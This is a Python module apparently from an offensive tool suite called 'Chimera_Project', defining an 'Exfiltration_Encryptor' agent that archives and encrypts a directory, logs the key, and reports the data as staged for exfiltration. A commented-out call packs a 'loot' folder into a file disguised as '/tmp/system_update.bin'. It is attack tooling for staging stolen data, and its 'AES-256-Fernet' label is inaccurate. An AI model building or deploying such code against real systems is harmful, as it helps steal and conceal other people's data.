import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import tarfile
import logging
from cryptography.fernet import Fernet

# Ensure the agent can find the core directory
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Exfiltration_Encryptor:
    def __init__(self):
        self.agent_id = "41"
        self.name = "Exfiltration_Encryptor"
        self.db = ChimeraDB()
        self.key = Fernet.generate_key() # In a real op, use a pre-shared key
        self.cipher = Fernet(self.key)
        
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(self.name)

    def pack_and_encrypt(self, source_dir, output_file):
        """Archives a directory and encrypts the resulting file."""
        temp_tar = "/tmp/data.tar.gz"
        try:
            # 1. Compress
            with tarfile.open(temp_tar, "w:gz") as tar:
                tar.add(source_dir, arcname=os.path.basename(source_dir))
            
            # 2. Encrypt
            with open(temp_tar, "rb") as f:
                data = f.read()
            
            encrypted_data = self.cipher.encrypt(data)
            
            with open(output_file, "wb") as f:
                f.write(encrypted_data)
                
            self.logger.warning(f"[!!!] DATA STAGED: {output_file} (Key: {self.key.decode()})")
            self.db.report_finding(self.name, "Data_Exfiltration_Ready", {
                "file": output_file,
                "encryption": "AES-256-Fernet"
            })
            os.remove(temp_tar)
        except Exception as e:
            self.logger.error(f"Exfiltration failed: {e}")

    def run(self):
        self.db.heartbeat(self.name)
        # self.pack_and_encrypt("/home/dan/Chimera_Project/loot", "/tmp/system_update.bin")
        self.db.close()

if __name__ == "__main__":
    agent = Exfiltration_Encryptor()
    agent.run()
